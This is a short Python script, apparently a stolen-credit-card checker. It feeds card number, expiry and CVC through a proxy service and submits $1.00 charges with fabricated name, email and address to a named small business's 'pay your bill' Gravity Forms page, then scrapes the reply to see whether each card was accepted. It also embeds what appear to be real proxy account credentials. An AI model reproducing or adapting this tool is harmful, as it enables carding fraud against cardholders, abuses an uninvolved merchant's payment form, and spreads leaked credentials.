import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'alarmsinc5280.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'origin': 'https://alarmsinc5280.com',
	    'referer': 'https://alarmsinc5280.com/pay-your-bill/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'iframe',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	files = [
	    ('input_1.3', (None, 'Rodam')),
	    ('input_1.6', (None, 'User')),
	    ('input_16', (None, '1')),
	    ('input_2', (None, f'rodamuser{random_amount1}{random_amount2}@gmail.com')),
	    ('input_2_2', (None, f'rodamuser{random_amount1}{random_amount2}@gmail.com')),
	    ('input_4.1', (None, 'Street 27')),
	    ('input_4.2', (None, '')),
	    ('input_4.3', (None, 'New York')),
	    ('input_4.4', (None, 'New York')),
	    ('input_4.5', (None, '10080')),
	    ('input_4.6', (None, 'United States')),
	    ('input_17', (None, '$1.00')),
	    ('input_18', (None, '$1.00')),
	    ('input_20.1', (None, f'{n}')),
	    ('input_20.2[]', (None, f'{mm}')),
	    ('input_20.2[]', (None, f'20{yy}')),
	    ('input_20.3', (None, f'{cvc}')),
	    ('input_20.5', (None, 'Rodam User')),
	    ('gform_ajax', (None, 'form_id=1&title=&description=1&tabindex=0&theme=gravity-theme&styles=[]&hash=803ddb847338452f3b891f864c8a0102')),
	    ('gform_submission_method', (None, 'iframe')),
	    ('gform_theme', (None, 'gravity-theme')),
	    ('gform_style_settings', (None, '[]')),
	    ('is_submit_1', (None, '1')),
	    ('gform_submit', (None, '1')),
	    ('gform_unique_id', (None, '')),
	    ('state_1', (None, 'WyJbXSIsImFjMzRhYTIzYzBiN2M0YTUzMDQxOGI5NzNhYTI3NDc0Il0=')),
	    ('gform_target_page_number_1', (None, '0')),
	    ('gform_source_page_number_1', (None, '1')),
	    ('gform_field_values', (None, '')),
	    ('version_hash', (None, 'cad79aeee17afc5c06094cbcde00d174')),
	]
	
	response = session.post('https://alarmsinc5280.com/pay-your-bill/', headers=headers, files=files)
	
	try:
		result = re.search(r'Credit Card: (.*?)<\/a><\/li><\/ol><\/div>', response.text).group(1)
	except:
		result = re.search(r"class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div><\/body>", response.text).group(1)
		
	return (result)
